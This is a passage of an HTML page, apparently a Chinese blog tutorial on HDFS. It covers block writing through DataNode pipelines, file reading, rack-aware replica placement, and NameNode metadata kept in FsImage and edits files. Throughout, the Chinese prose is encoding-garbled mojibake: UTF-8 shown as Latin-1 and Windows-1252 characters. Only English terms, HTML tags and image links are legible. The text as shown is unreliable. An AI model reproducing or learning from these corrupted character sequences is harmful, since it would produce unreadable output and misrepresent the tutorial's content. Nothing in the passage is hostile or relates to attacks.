<li>NameNodeæ ¹æ®æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶å—é…ç½®æƒ…å†µï¼Œè¿”å›ç»™Clientå®ƒæ‰€ç®¡ç†éƒ¨åˆ†DataNodeçš„ä¿¡æ¯ã€‚</li>
<li>Clientå°†æ–‡ä»¶åˆ’åˆ†ä¸ºå¤šä¸ªblockå—ï¼Œå¹¶æ ¹æ®DataNodeçš„åœ°å€ä¿¡æ¯ï¼ŒæŒ‰é¡ºåºå†™å…¥åˆ°æ¯ä¸€ä¸ªDataNodeå—ä¸­ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220103741.png" alt="58qho28cfd"></p>
<p>ä¾‹å¦‚ï¼šæœ‰ä¸€ä¸ªæ–‡ä»¶FileAï¼Œ100Må¤§å°ã€‚Clientå°†FileAå†™å…¥åˆ°HDFSä¸Šã€‚</p>
<ol>
<li>HDFSæŒ‰é»˜è®¤é…ç½®ã€‚</li>
<li>HDFSåˆ†å¸ƒåœ¨ä¸‰ä¸ªæœºæ¶ä¸ŠRack1ï¼ŒRack2ï¼ŒRack3ã€‚</li>
</ol>
<p>æ–‡ä»¶å†™å…¥è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>Clientå°†FileAæŒ‰64Måˆ†å—ã€‚åˆ†æˆä¸¤å—ï¼Œblock1å’ŒBlock2;</li>
<li>Clientå‘NameNodeå‘é€å†™æ•°æ®è¯·æ±‚ï¼Œå¦‚å›¾è“è‰²è™šçº¿â‘ â€”â€”&gt;ã€‚</li>
<li>NameNodeèŠ‚ç‚¹ï¼Œè®°å½•blockä¿¡æ¯ã€‚å¹¶è¿”å›å¯ç”¨çš„DataNodeï¼Œå¦‚ç²‰è‰²è™šçº¿â‘¡â€”â€”â€”&gt;ã€‚<ol>
<li>Block1: host2,host1,host3</li>
<li>Block2: host7,host8,host4</li>
<li>åŸç†ï¼š<ol>
<li>NameNodeå…·æœ‰RackAwareæœºæ¶æ„ŸçŸ¥åŠŸèƒ½ï¼Œè¿™ä¸ªå¯ä»¥é…ç½®ã€‚</li>
<li>è‹¥Clientä¸ºDataNodeèŠ‚ç‚¹ï¼Œé‚£å­˜å‚¨blockæ—¶ï¼Œè§„åˆ™ä¸ºï¼šå‰¯æœ¬1ï¼ŒåŒClientçš„èŠ‚ç‚¹ä¸Šï¼›å‰¯æœ¬2ï¼Œä¸åŒæœºæ¶èŠ‚ç‚¹ä¸Šï¼›å‰¯æœ¬3ï¼ŒåŒç¬¬äºŒä¸ªå‰¯æœ¬æœºæ¶çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼›å…¶ä»–å‰¯æœ¬éšæœºæŒ‘é€‰ã€‚</li>
<li>è‹¥Clientä¸ä¸ºDataNodeèŠ‚ç‚¹ï¼Œé‚£å­˜å‚¨blockæ—¶ï¼Œè§„åˆ™ä¸ºï¼šå‰¯æœ¬1ï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼›å‰¯æœ¬2ï¼Œä¸åŒå‰¯æœ¬1ï¼Œæœºæ¶ä¸Šï¼›å‰¯æœ¬3ï¼ŒåŒå‰¯æœ¬2ç›¸åŒçš„å¦ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼›å…¶ä»–å‰¯æœ¬éšæœºæŒ‘é€‰ã€‚</li>
</ol>
</li>
</ol>
</li>
<li>Clientå‘DataNodeå‘é€block1ï¼›å‘é€è¿‡ç¨‹æ˜¯ä»¥æµå¼å†™å…¥ã€‚æµå¼å†™å…¥è¿‡ç¨‹å¦‚ä¸‹ï¼š<ol>
<li>å°†64Mçš„block1æŒ‰64kçš„packageåˆ’åˆ†;</li>
<li>ç„¶åå°†ç¬¬ä¸€ä¸ªpackageå‘é€ç»™host2;</li>
<li>host2æ¥æ”¶å®Œåï¼Œå°†ç¬¬ä¸€ä¸ªpackageå‘é€ç»™host1ï¼ŒåŒæ—¶Clientå‘host2å‘é€ç¬¬äºŒä¸ªpackageï¼›</li>
<li>host1æ¥æ”¶å®Œç¬¬ä¸€ä¸ªpackageåï¼Œå‘é€ç»™host3ï¼ŒåŒæ—¶æ¥æ”¶host2å‘æ¥çš„ç¬¬äºŒä¸ªpackageã€‚</li>
<li>ä»¥æ­¤ç±»æ¨ï¼Œå¦‚å›¾çº¢çº¿å®çº¿æ‰€ç¤ºï¼Œç›´åˆ°å°†block1å‘é€å®Œæ¯•ã€‚</li>
<li>host2,host1,host3å‘NameNodeï¼Œhost2å‘Clientå‘é€é€šçŸ¥ï¼Œè¯´â€œæ¶ˆæ¯å‘é€å®Œäº†â€ã€‚å¦‚å›¾ç²‰çº¢é¢œè‰²å®çº¿æ‰€ç¤ºã€‚</li>
<li>Clientæ”¶åˆ°host2å‘æ¥çš„æ¶ˆæ¯åï¼Œå‘NameNodeå‘é€æ¶ˆæ¯ï¼Œè¯´æˆ‘å†™å®Œäº†ã€‚è¿™æ ·å°±çœŸå®Œæˆäº†ã€‚å¦‚å›¾é»„è‰²ç²—å®çº¿</li>
<li>å‘é€å®Œblock1åï¼Œå†å‘host7ã€host8ã€host4å‘é€block2ï¼Œå¦‚å›¾è“è‰²å®çº¿æ‰€ç¤ºã€‚</li>
<li>å‘é€å®Œblock2åï¼Œhost7ã€host8ã€host4å‘NameNodeï¼Œhost7å‘Clientå‘é€é€šçŸ¥ï¼Œå¦‚å›¾æµ…ç»¿è‰²å®çº¿æ‰€ç¤ºã€‚</li>
<li>Clientå‘NameNodeå‘é€æ¶ˆæ¯ï¼Œè¯´æˆ‘å†™å®Œäº†ï¼Œå¦‚å›¾é»„è‰²ç²—å®çº¿ã€‚ã€‚ã€‚è¿™æ ·å°±å®Œæ¯•äº†ã€‚</li>
</ol>
</li>
<li>åˆ†æï¼šé€šè¿‡å†™è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°<ol>
<li>å†™1Tæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦3Tçš„å­˜å‚¨ï¼Œ3Tçš„ç½‘ç»œæµé‡å¸¦å®½ã€‚</li>
<li>åœ¨æ‰§è¡Œè¯»æˆ–å†™çš„è¿‡ç¨‹ä¸­ï¼ŒNameNodeå’ŒDataNodeé€šè¿‡HeartBeatè¿›è¡Œä¿å­˜é€šä¿¡ï¼Œç¡®å®šDataNodeæ´»ç€ã€‚å¦‚æœå‘ç°DataNodeæ­»æ‰äº†ï¼Œå°±å°†æ­»æ‰çš„DataNodeä¸Šçš„æ•°æ®ï¼Œæ”¾åˆ°å…¶ä»–èŠ‚ç‚¹å»ã€‚è¯»å–æ—¶ï¼Œè¦è¯»å…¶ä»–èŠ‚ç‚¹å»ã€‚</li>
<li>æŒ‚æ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ²¡å…³ç³»ï¼Œè¿˜æœ‰å…¶ä»–èŠ‚ç‚¹å¯ä»¥å¤‡ä»½ï¼›ç”šè‡³ï¼ŒæŒ‚æ‰æŸä¸€ä¸ªæœºæ¶ï¼Œä¹Ÿæ²¡å…³ç³»ï¼›å…¶ä»–æœºæ¶ä¸Šï¼Œä¹Ÿæœ‰å¤‡ä»½ã€‚</li>
</ol>
</li>
</ol>
<h3 id="HDFSæ–‡ä»¶è¯»å–"><a href="#HDFSæ–‡ä»¶è¯»å–" class="headerlink" title="HDFSæ–‡ä»¶è¯»å–"></a>HDFSæ–‡ä»¶è¯»å–</h3><p>å½“æ–‡ä»¶è¯»å–ï¼š</p>
<ol>
<li>Clientå‘NameNodeå‘èµ·æ–‡ä»¶è¯»å–çš„è¯·æ±‚ã€‚</li>
<li>NameNodeè¿”å›æ–‡ä»¶å­˜å‚¨çš„blockå—ä¿¡æ¯ã€åŠå…¶blockå—æ‰€åœ¨DataNodeçš„ä¿¡æ¯ã€‚</li>
<li>Clientè¯»å–æ–‡ä»¶ä¿¡æ¯ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220104177.png" alt="1"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼ŒClientè¦ä»DataNodeä¸Šï¼Œè¯»å–FileAã€‚è€ŒFileAç”±block1å’Œblock2ç»„æˆã€‚è¯»æ“ä½œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>Clientå‘NameNodeå‘é€è¯»è¯·æ±‚ã€‚</li>
<li>NameNodeæŸ¥çœ‹Metadataä¿¡æ¯ï¼Œè¿”å›FileAçš„blockçš„ä½ç½®ã€‚<ol>
<li>block1:host2,host1,host3</li>
<li>block2:host7,host8,host4</li>
</ol>
</li>
<li>blockçš„ä½ç½®æ˜¯æœ‰å…ˆåé¡ºåºçš„ï¼Œå…ˆè¯»block1ï¼Œå†è¯»block2ã€‚è€Œä¸”block1å»host2ä¸Šè¯»å–ï¼›ç„¶åblock2ï¼Œå»host7ä¸Šè¯»å–ã€‚</li>
</ol>
<p>ä¸Šé¢ä¾‹å­ä¸­ï¼ŒClientä½äºæœºæ¶å¤–ï¼Œé‚£ä¹ˆå¦‚æœClientä½äºæœºæ¶å†…æŸä¸ªDataNodeä¸Šï¼Œä¾‹å¦‚,Clientæ˜¯host6ã€‚é‚£ä¹ˆè¯»å–çš„æ—¶å€™ï¼Œéµå¾ªçš„è§„å¾‹æ˜¯ï¼š<strong>ä¼˜é€‰è¯»å–æœ¬æœºæ¶ä¸Šçš„æ•°æ®ã€‚</strong></p>
<p>é—®é¢˜ï¼šå¦‚æœè¯»å–blockæ˜¯æŒ‰ç…§å…ˆåé¡ºåºè¯»ï¼Œæ˜¯å¦æ„å‘³ç€åœ¨ä¸åŒå‰¯æœ¬ä¹‹é—´çš„è¯»å–æ˜¯ä¸å¹³å‡çš„ï¼Œæ²¡æœ‰è€ƒè™‘é€šè¿‡è´Ÿè½½ç­–ç•¥æ¥æé«˜è¯»æ•ˆç‡å—ï¼Ÿ</p>
<h3 id="å¤‡ä»½æ•°æ®çš„å­˜æ”¾"><a href="#å¤‡ä»½æ•°æ®çš„å­˜æ”¾" class="headerlink" title="å¤‡ä»½æ•°æ®çš„å­˜æ”¾"></a>å¤‡ä»½æ•°æ®çš„å­˜æ”¾</h3><p>å¤‡ä»½æ•°æ®çš„å­˜æ”¾æ˜¯HDFSå¯é æ€§å’Œæ€§èƒ½çš„å…³é”®ã€‚HDFSé‡‡ç”¨ä¸€ç§ç§°ä¸ºrack-awareçš„ç­–ç•¥æ¥å†³å®šå¤‡ä»½æ•°æ®çš„å­˜æ”¾ã€‚</p>
<p>é€šè¿‡ä¸€ä¸ªç§°ä¸ºRack Awarenessçš„è¿‡ç¨‹ï¼ŒNameNodeå†³å®šæ¯ä¸ªDataNodeæ‰€å±rack idã€‚</p>
<p>ç¼ºçœæƒ…å†µä¸‹ï¼Œä¸€ä¸ªblockå—ä¼šæœ‰ä¸‰ä¸ªå¤‡ä»½ï¼š</p>
<ol>
<li>ä¸€ä¸ªåœ¨NameNodeæŒ‡å®šçš„DataNodeä¸Š</li>
<li>ä¸€ä¸ªåœ¨æŒ‡å®šDataNodeéåŒä¸€rackçš„DataNodeä¸Š</li>
<li>ä¸€ä¸ªåœ¨æŒ‡å®šDataNodeåŒä¸€rackçš„DataNodeä¸Šã€‚</li>
</ol>
<p>è¿™ç§ç­–ç•¥ç»¼åˆè€ƒè™‘äº†åŒä¸€rackå¤±æ•ˆã€ä»¥åŠä¸åŒrackä¹‹é—´æ•°æ®å¤åˆ¶æ€§èƒ½é—®é¢˜ã€‚</p>
<p>å‰¯æœ¬çš„é€‰æ‹©ï¼šä¸ºäº†é™ä½æ•´ä½“çš„å¸¦å®½æ¶ˆè€—å’Œè¯»å–å»¶æ—¶ï¼ŒHDFSä¼šå°½é‡è¯»å–æœ€è¿‘çš„å‰¯æœ¬ã€‚å¦‚æœåœ¨åŒä¸€ä¸ªrackä¸Šæœ‰ä¸€ä¸ªå‰¯æœ¬ï¼Œé‚£ä¹ˆå°±è¯»è¯¥å‰¯æœ¬ã€‚å¦‚æœä¸€ä¸ªHDFSé›†ç¾¤è·¨è¶Šå¤šä¸ªæ•°æ®ä¸­å¿ƒï¼Œé‚£ä¹ˆå°†é¦–å…ˆå°è¯•è¯»æœ¬åœ°æ•°æ®ä¸­å¿ƒçš„å‰¯æœ¬ã€‚</p>
<h3 id="Editså’ŒFsimageè¯¦è§£ä¸åˆå¹¶æµç¨‹"><a href="#Editså’ŒFsimageè¯¦è§£ä¸åˆå¹¶æµç¨‹" class="headerlink" title="Editså’ŒFsimageè¯¦è§£ä¸åˆå¹¶æµç¨‹"></a>Editså’ŒFsimageè¯¦è§£ä¸åˆå¹¶æµç¨‹</h3><h4 id="NameNodeå¦‚ä½•ç®¡ç†å’Œå­˜å‚¨å…ƒæ•°æ®"><a href="#NameNodeå¦‚ä½•ç®¡ç†å’Œå­˜å‚¨å…ƒæ•°æ®" class="headerlink" title="NameNodeå¦‚ä½•ç®¡ç†å’Œå­˜å‚¨å…ƒæ•°æ®"></a>NameNodeå¦‚ä½•ç®¡ç†å’Œå­˜å‚¨å…ƒæ•°æ®</h4><p>è®¡ç®—æœºä¸­å­˜å‚¨æ•°æ®æœ‰ä¸¤ç§ï¼šå†…å­˜æˆ–ç£ç›˜ å…ƒæ•°æ®å­˜å‚¨ç£ç›˜: å­˜å‚¨ç£ç›˜æ— æ³•é¢å¯¹å®¢æˆ·ç«¯å¯¹å…ƒæ•°æ®ä¿¡æ¯çš„ä»»æ„çš„å¿«é€Ÿä½å»¶è¿Ÿçš„å“åº”ï¼Œä½†æ˜¯å®‰å…¨æ€§é«˜å…ƒæ•°æ®å­˜å‚¨å†…å­˜ï¼šå…ƒæ•°æ®å­˜æ”¾å†…å­˜ï¼Œå¯ä»¥é«˜æ•ˆçš„æŸ¥è¯¢ä»¥åŠå¿«é€Ÿå“åº”å®¢æˆ·ç«¯çš„æŸ¥è¯¢è¯·æ±‚ï¼Œæ•°æ®ä¿å­˜åœ¨å†…å­˜ï¼Œå¦‚æœæ–­ç”µï¼Œå†…å­˜ä¸­çš„æ•°æ®å…¨éƒ¨ä¸¢å¤±</p>
<p>å› æ­¤ï¼Œè€ƒè™‘ä¸Šè¿°ä¸¤ç§å­˜å‚¨æ–¹å¼çš„ä¼˜ç¼ºç‚¹ï¼ŒHDFSé‡‡ç”¨äº†å†…å­˜+ç£ç›˜çš„å½¢å¼æ¥ç®¡ç†å…ƒæ•°æ®ã€‚å³: NameNode(å†…å­˜)+FsImageæ–‡ä»¶. å…¶ä¸­ï¼ŒNameNodeæ–‡ä»¶ç»´æŠ¤äº†æ–‡ä»¶ä¸æ•°æ®å—çš„æ˜ å°„è¡¨ä»¥åŠæ•°æ®å—ä¸æ•°æ®èŠ‚ç‚¹çš„æ˜ å°„è¡¨ï¼Œæ¯”å¦‚ï¼Œä¸€ä¸ªæ–‡ä»¶å®ƒè¢«åˆ‡åˆ†æˆäº†å‡ ä¸ªæ•°æ®å—ï¼Œè¿™äº›æ•°æ®å—åˆ†åˆ«å­˜å‚¨åœ¨å“ªäº›datanodeèŠ‚ç‚¹ä¸Šã€‚è€ŒFsimageä¿å­˜åœ¨ç£ç›˜ä¸Šï¼Œä¸ºæŸä¸€æ—¶åˆ»ä¸‹å†…å­˜ä¸­å…ƒæ•°æ®åœ¨æœ¬åœ°ç£ç›˜çš„æ˜ å°„ã€‚å°±æ˜¯åœ¨è¯¥æ—¶åˆ»ä¸‹ï¼Œå†…å­˜ä¸­å…ƒæ•°æ®è®°å½•çš„æ‰€æœ‰æ–‡ä»¶å—å’Œç›®å½•ï¼Œåˆ†åˆ«çš„çŠ¶æ€ï¼Œä½äºå“ªäº›datanodeï¼Œå„è‡ªçš„æƒé™ï¼Œå„è‡ªçš„å‰¯æœ¬ä¸ªæ•°ç­‰ (å¯ä»¥é€šè¿‡æŸ¥çœ‹Fsimageä¿å­˜çš„å†…å®¹å¯ä»¥çœ‹åˆ°ä¸Šè¿°ä¿¡æ¯)ã€‚å› æ­¤ï¼Œåˆ©ç”¨<strong>å†…å­˜</strong>+<strong>ç£ç›˜</strong>çš„æ–¹å¼ï¼Œå†…å­˜ä¸­çš„å…ƒæ•°æ®å¯ä»¥å¿«é€Ÿå“åº”å®¢æˆ·ç«¯çš„ç”¨æˆ·è¯·æ±‚ï¼Œè€Œæ˜ å°„åˆ°ç£ç›˜ä¸­çš„å…ƒæ•°æ®Fsimageå¯ä»¥å®ç°å®‰å…¨æ€§ï¼Œé˜²æ­¢æ•°æ®çš„ä¸¢å¤±ã€‚</p>
<p>è€Œæ¥ä¸‹æ¥çš„ä¸€ä¸ªæ–°é—®é¢˜æ˜¯ï¼šç£ç›˜å’Œå†…å­˜ä¸­çš„å…ƒæ•°æ®å¦‚ä½•è¿›è¡Œåˆ’åˆ†ã€‚ å³ä¸¤ä¸ªæ•°æ®ä¸€æ‘¸ä¸€æ ·ï¼Œè¿˜æ˜¯ä¸¤ä¸ªæ•°æ®åˆå¹¶åˆ°ä¸€èµ·æ‰æ˜¯ä¸€ä»½å®Œæ•´çš„æ•°æ®å‘¢ï¼Ÿ</p>
<ul>
<li><strong>ä¸€æ¨¡ä¸€æ ·</strong>ï¼šclientå¦‚æœå¯¹å…ƒæ•°æ®è¿›è¡Œå¢åˆ æ”¹æ“ä½œï¼Œéœ€è¦ä¿è¯ä¸¤ä¸ªæ•°æ®çš„ä¸€è‡´ã€‚FsImageæ–‡ä»¶æ“ä½œèµ·æ¥æ•ˆç‡ä¹Ÿä¸é«˜ï¼Œå› ä¸ºFsImageå­˜å‚¨åœ¨ç£ç›˜ä¸­ï¼Œå¯¹ç£ç›˜ä¸­çš„å†…å®¹è¿›è¡Œå†™å…¥åŠ¿å¿…ä¼šå¢åŠ å¾ˆå¤šçš„IOæ“ä½œï¼Œä¹Ÿè¦å ç”¨CPUã€‚æ­¤æ—¶ï¼Œç›¸å½“äºæ¯ä¸€æ¬¡å¢åˆ æ”¹æ“ä½œï¼Œéƒ½éœ€è¦å¯¹ä¸¤ä¸ªæ–‡ä»¶åŒæ—¶è¿›è¡Œä¿®æ”¹ã€‚</li>
<li><strong>ä¸¤ä¸ªåˆå¹¶&#x3D;å®Œæ•´æ•°æ®</strong>ï¼šç”±äºå¦‚æœè¦å°†æ“ä½œå†™å…¥ç£ç›˜ä¼šé™ä½è¿è¡Œæ•ˆç‡ã€‚æ‰€ä»¥æƒ³æ³•å°±æ˜¯å¯¹äºå¢åˆ æ”¹æ“ä½œï¼Œåªæœ‰å†…å­˜ä¸­çš„å…ƒæ•°æ®è¿›è¡Œå“åº”ï¼Œè€Œä¸ç›´æ¥è¿›è¡Œç£ç›˜IOè¯»å†™ã€‚æ­¤æ—¶ï¼Œä¸ºäº†ä¿è¯ä¸¤ä¸ªæ•°æ®çš„ä¸€è‡´æ€§ï¼ŒNameNodeå°±å¼•å…¥äº†ä»¥ä¸€ä¸ªeditsæ–‡ä»¶ï¼Œè¯¥æ—¥å¿—æ–‡ä»¶åªèƒ½è¿›è¡Œè¿½åŠ å†™å…¥ï¼Œä»¥æ­¤æ¥è®°å½•clientçš„æ¯æ¬¡å¢åˆ æ”¹æ“ä½œã€‚è™½ç„¶æ­¤æ—¶ä»ç„¶æœ‰IOæµçš„æ“ä½œï¼Œä½†æ˜¯ç›¸æ¯”äºæ¯æ¬¡å°†å…ƒæ•°æ®å†…å®¹å†™å…¥Fsimageï¼Œeditsæ—¥å¿—æ–‡ä»¶çš„å†™å…¥å†…å®¹æ›´å°‘ï¼Œæ•ˆç‡æ›´é«˜ã€‚</li>
</ul>
<p>è‡³æ­¤æˆ‘ä»¬çŸ¥é“äº†HDFSå…ƒæ•°æ®ç®¡ç†æœºåˆ¶é‡‡ç”¨äº†å†…å­˜+ç£ç›˜çš„å½¢å¼ï¼Œå†…å­˜ä¸­çš„NameNodeæ¥å¿«é€Ÿå“åº”å®¢æˆ·ç«¯çš„æŸ¥è¯¢è¯·æ±‚ï¼Œç£ç›˜ä¸­çš„å…ƒæ•°æ®ä½œä¸ºå¤‡ä»½ï¼Œé˜²æ­¢æ•°æ®çš„ä¸¢å¤±ã€‚åŒæ—¶ï¼Œä¸ºäº†ä¿è¯å†…å­˜å’Œç£ç›˜ä¸­å…ƒæ•°æ®çš„ä¸€è‡´ï¼Œhdfsé‡‡ç”¨äº†ä¸€ä¸ªeditsçš„æ—¥å¿—æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯å¯¹å…ƒæ•°æ®çš„æ“ä½œã€‚åˆ©ç”¨edits+Fsimageçš„å½¢å¼ï¼Œå°±å®Œæˆäº†å¯¹å…ƒæ•°æ®çš„ç®¡ç†å’Œå­˜å‚¨ã€‚</p>
<h4 id="FsImage"><a href="#FsImage" class="headerlink" title="FsImage"></a>FsImage</h4><p>FsImage: æ˜¯namenodeä¸­å…³äºå…ƒæ•°æ®çš„é•œåƒï¼Œä¸€èˆ¬ç§°ä¸ºæ£€æŸ¥ç‚¹(checkpoing)ï¼Œè¿™é‡ŒåŒ…å«äº†HDFSæ–‡ä»¶ç³»ç»Ÿæ‰€æœ‰ç›®å½•ä»¥åŠæ–‡ä»¶ç›¸å…³ä¿¡æ¯ï¼ˆBlockæ•°é‡ï¼Œå‰¯æœ¬æ•°é‡ï¼Œæƒé™ç­‰ä¿¡æ¯ï¼‰</p>
<p>åœ¨æœºå™¨å­¦ä¹ æˆ–è¿™æ·±åº¦å­¦ä¹ æ¨¡å‹è®­ç»ƒçš„è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†é˜²æ­¢å¼‚å¸¸ä¸­æ–­ï¼Œæ‰€ä»¥éƒ½ä¼šè®¾å®šåœ¨æŸä¸€å…·ä½“æ—¶åˆ»æˆ–è€…æ•ˆæœè¾¾åˆ°æœ€å¥½ç»“æœæ—¶ï¼Œå°†æ¨¡å‹å‚æ•°éƒ½ä¿å­˜ä¸‹æ¥ã€‚è¿™æ ·ï¼Œåç»­å°±å¯ä»¥åœ¨å¼‚å¸¸ä¸­æ–­ååˆ©ç”¨æ¥æ–‡ä»¶ç›´æ¥å¯¹æ¨¡å‹çš„å‚æ•°è¿›è¡Œåˆå§‹åŒ–èµ‹å€¼ï¼Œè€Œä¸ç”¨å†é‡æ–°è¿›è¡Œè®­ç»ƒã€‚åœ¨æ¨¡å‹è®­ç»ƒä¸­ä¿å­˜çš„æ–‡ä»¶ä¹Ÿå«ä½œcheckpointã€‚å› æ­¤è¿™é‡ŒHDFSçš„æ£€æŸ¥ç‚¹checkpointä¹Ÿå¯ä»¥åŒæ ·æ¥ç†è§£ã€‚å³FsImageä¿å­˜äº†æŸä¸€æ—¶åˆ»ä¸‹å…ƒæ•°æ®å†…çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™æ ·ï¼Œå½“HDFSå¼‚å¸¸ä¸­æ–­æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨è¯¥æ£€æŸ¥ç‚¹æ–‡ä»¶ï¼Œæ¥å¯¹å…ƒæ•°æ®è¿›è¡Œåˆå§‹åŒ–ï¼Œä»¥æ­¤è¿˜åŸåˆ°å¼‚å¸¸ä¸­æ–­æˆ–ç¨‹åºåœæ­¢å‰çš„æœ€æ–°çŠ¶æ€ã€‚</p>
<h4 id="Editsæ–‡ä»¶"><a href="#Editsæ–‡ä»¶" class="headerlink" title="Editsæ–‡ä»¶"></a>Editsæ–‡ä»¶</h4><p>å­˜å‚¨äº†å®¢æˆ·ç«¯å¯¹HDFSæ–‡ä»¶ç³»ç»Ÿæ‰€æœ‰çš„æ›´æ–°æ“ä½œè®°å½•ï¼ŒClientå¯¹HDFSæ–‡ä»¶ç³»ç»Ÿæ‰€æœ‰çš„æ›´æ–°æ“ä½œéƒ½ä¼šè¢«è®°å½•åˆ°Editsæ–‡ä»¶ä¸­(ä¸åŒ…æ‹¬æŸ¥è¯¢æ“ä½œ)</p>
<p>Clientå¯¹HDFSçš„æ›´æ–°æ“ä½œä¼šæ›´æ–°å†…å­˜ä¸­çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œè€Œä¸ä¼šç›´æ¥å†™å…¥åˆ°FsImageæ–‡ä»¶ä¸­ã€‚é‚£ä¹ˆä¸ºäº†ä¿è¯å†…å­˜å’Œç£ç›˜ä¸­å…ƒæ•°æ®ä¿¡æ¯çš„ä¸€è‡´æ€§ï¼Œå°±åˆ©ç”¨äº†editsæ–‡ä»¶æ¥è®°å½•ä¸‹æ‰€æœ‰çš„æ›´æ–°æ“ä½œã€‚<strong>editsæ–‡ä»¶è®°å½•çš„å°±æ˜¯å½“åŸFsImageè¢«è½½å…¥å†…å­˜åï¼ŒClientåˆå¯¹å…ƒæ•°æ®è¿›è¡Œäº†å“ªäº›æ“ä½œã€‚</strong> è¿™æ ·ï¼Œåªè¦åœ¨åŸFsImageä¸­æ‰§è¡Œè¿™äº›æ“ä½œï¼Œå¯¹ä¿å­˜çš„å…ƒæ•°æ®ä¿¡æ¯è¿›è¡Œæ›´æ–°ï¼Œå°±å¯ä»¥ä½¿å¾—å†…å­˜å’Œç£ç›˜æ±‡æ€»çš„å…ƒæ•°æ®ä¿¡æ¯ä¸€è‡´ã€‚é€šè¿‡æ­¤æ–¹æ³•ï¼Œå³è§£å†³äº†ä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼Œè¦å¯¹FsImageç›´æ¥è¿›è¡Œå†™å…¥çš„è¿‡ç¨‹ã€‚è¿™ä¹Ÿæ˜¯å¼•å…¥editsæ–‡ä»¶çš„å…³é”®åŸå› ã€‚</p>
<h4 id="Fsimageä¸Editsçš„åˆå¹¶"><a href="#Fsimageä¸Editsçš„åˆå¹¶" class="headerlink" title="Fsimageä¸Editsçš„åˆå¹¶"></a>Fsimageä¸Editsçš„åˆå¹¶</h4><p>å› ä¸ºeditsæ–‡ä»¶æ˜¯ä¸€ä¸ªåªèƒ½è¿½åŠ å†™å…¥çš„æ–‡ä»¶ï¼Œåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ä¼šä¸æ–­çš„è®°å½•å®¢æˆ·ç«¯çš„æ›´æ–°æ“ä½œã€‚åŒæ—¶ï¼Œæ ¹æ®ä¸Šé¢å¯¹Editsä¸­çš„ä»‹ç»å¯çŸ¥ï¼Œå¼•å…¥è½½å…¥çš„FsImageçš„å…ƒæ•°æ®å†…å®¹ä¸æ˜¯æœ€æ–°çŠ¶æ€ï¼Œæ‰€ä»¥åªæœ‰åœ¨FsImageçš„å†…å®¹ä¸Šï¼Œæ‰§è¡Œeditsæ–‡ä»¶ä¸­çš„æ›´æ–°æ“ä½œï¼Œæ‰èƒ½å°†FsImageçš„å…ƒæ•°æ®æ›´æ–°ä¸ºæœ€æ–°çŠ¶æ€ã€‚æ­¤æ—¶ï¼Œå‡è®¾editsä¸æ–­çš„è¿›è¡Œè¿½åŠ å†™ï¼Œå½“æŸä¸€æ—¶åˆ»éœ€è¦NameNodeé‡å¯æ—¶ï¼Œæ­¤æ—¶NameNodeä¼šå…ˆå°†FsImageé‡Œé¢çš„å†…å®¹æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œå³ç›¸å½“äºå¯¹å…ƒæ•°æ®è¿›è¡Œåˆå§‹åŒ–ï¼ŒåŒæ—¶ä¸ºäº†æ¢å¤åˆ°æœ€æ–°çš„çŠ¶æ€ï¼Œè¿˜éœ€è¦åœ¨ä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œeditsä¸­çš„è®°å½•ã€‚å½“editsæ–‡ä»¶éå¸¸å¤§æ—¶ï¼Œä¼šå¯¼è‡´NameNodeå¯åŠ¨è¿‡ç¨‹éå¸¸æ…¢ï¼Œè€Œåœ¨è¿™æ®µæ—¶é—´HDFSç³»ç»Ÿä¼šå¤„äº<strong>å®‰å…¨æ¨¡å¼</strong>ï¼Œå³ä¿è¯äº†è¦å°†å…ƒæ•°æ®æ¢å¤åˆ°æœ€æ–°åæ‰èƒ½æ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚ã€‚è¿™æ˜¾ç„¶æ˜¯ä¸ç¬¦åˆç”¨æˆ·è¦æ±‚çš„ã€‚å› æ­¤ï¼Œå°±éœ€è¦è®¾è®¡èƒ½ä¸èƒ½åœ¨NameNodeè¿è¡Œçš„æ—¶å€™ä½¿å¾—editsæ–‡ä»¶å°ä¸€äº›ï¼Œè¿™æ ·å°±èƒ½ä½¿å¯åŠ¨è¿‡ç¨‹åŠ å¿«ã€‚æ‰€ä»¥å°±è¦å¼•å…¥FsImageå’ŒEditsçš„åˆå¹¶è¿‡ç¨‹ã€‚</p>
<p>åˆå¹¶è¿‡ç¨‹çš„æ‰§è¡Œæµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220104944.jpg" alt="2"></p>
